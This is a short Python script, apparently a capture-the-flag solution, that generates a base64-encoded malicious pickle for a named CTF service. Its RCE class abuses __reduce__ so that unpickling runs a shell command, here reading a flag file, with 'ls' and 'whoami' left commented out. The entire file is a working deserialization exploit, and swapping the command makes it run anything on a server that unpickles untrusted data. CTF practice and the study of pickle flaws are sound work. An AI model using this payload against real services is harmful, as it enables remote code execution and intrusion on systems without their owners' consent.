# -*- coding: utf-8 -*-
"""
Minimal exploit script for Python pickles.
Generate an encoded string that can be passed to pickle to be executed as shell
commands.
Pass to http://sauerkraut.c.ctf-snyk.io/ to capture the flag.
"""

import pickle
import base64
#import os
import subprocess


class RCE:
    def __reduce__(self):
        # cmd = ('ls')
        # cmd = ('whoami')
        cmd = ['cat','flag']
        return subprocess.check_output, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))

